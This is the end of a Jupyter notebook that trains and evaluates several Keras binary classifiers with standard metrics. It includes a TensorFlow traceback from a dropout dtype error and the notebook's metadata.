      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\backend.py\u001b[0m in \u001b[0;36mdropout\u001b[1;34m(x, level, noise_shape, seed)\u001b[0m\n\u001b[0;32m   4681\u001b[0m   \u001b[1;32mif\u001b[0m \u001b[0mseed\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   4682\u001b[0m     \u001b[0mseed\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mnp\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mrandom\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mrandint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;36m10e6\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 4683\u001b[1;33m   \u001b[1;32mreturn\u001b[0m \u001b[0mnn\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdropout_v2\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mx\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mrate\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mlevel\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mnoise_shape\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mnoise_shape\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mseed\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mseed\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   4684\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   4685\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\ops\\nn_ops.py\u001b[0m in \u001b[0;36mdropout_v2\u001b[1;34m(x, rate, noise_shape, seed, name)\u001b[0m\n\u001b[0;32m   4361\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[1;32mnot\u001b[0m \u001b[0mx\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdtype\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mis_floating\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   4362\u001b[0m       raise ValueError(\"x has to be a floating point tensor since it's going to\"\n\u001b[1;32m-> 4363\u001b[1;33m                        \" be scaled. Got a %s tensor instead.\" % x.dtype)\n\u001b[0m\u001b[0;32m   4364\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0misinstance\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mrate\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mnumbers\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mReal\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   4365\u001b[0m       \u001b[1;32mif\u001b[0m \u001b[1;32mnot\u001b[0m \u001b[1;33m(\u001b[0m\u001b[0mrate\u001b[0m \u001b[1;33m>=\u001b[0m \u001b[1;36m0\u001b[0m \u001b[1;32mand\u001b[0m \u001b[0mrate\u001b[0m \u001b[1;33m<\u001b[0m \u001b[1;36m1\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mValueError\u001b[0m: x has to be a floating point tensor since it's going to be scaled. Got a <dtype: 'int32'> tensor instead."
     ]
    }
   ],
   "source": [
    "  METRICS = [\n",
    "    keras.metrics.TruePositives(name='tp'),\n",
    "    keras.metrics.FalsePositives(name='fp'),\n",
    "    keras.metrics.TrueNegatives(name='tn'),\n",
    "    keras.metrics.FalseNegatives(name='fn'), \n",
    "    # Precision: (TP) / (TP + FP)\n",
    "    # what proportion of predicted Positives is truly Positive\n",
    "    keras.metrics.Precision(name='precision'),\n",
    "    # Recall: (TP) / (TP+FN)\n",
    "    # what proportion of actual Positives is correctly classified\n",
    "    keras.metrics.Recall(name='recall'),\n",
    "    keras.metrics.AUC(name='auc'),\n",
    "    keras.metrics.Accuracy(name='accuracy')\n",
    "    ]\n",
    "\n",
    "for i, (name, model) in enumerate(models.items()):\n",
    "  print(f\"\\n{i}th model: {name}!\")\n",
    "\n",
    "  OPT = keras.optimizers.Adam()\n",
    "  model.compile(optimizer=OPT, loss='binary_crossentropy', metrics=METRICS)\n",
    "  \n",
    "  h = model.fit(train_Xds, epochs=100, verbose=0)\n",
    "  plt.figure(figsize=[8, 4])\n",
    "  plot_loss(h.epoch, h.history, f\"\\n{i}th model, {name}\", i)\n",
    "  \n",
    "  results = model.evaluate(val_Xds)\n",
    "  \n",
    "  for name, value in zip(model.metrics_names, results):\n",
    "    print(name, ': ', value)\n",
    "  print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.5-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "python37564bita866c8c9cf084ebd97979ec2adc3c734",
   "display_name": "Python 3.7.5 64-bit"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}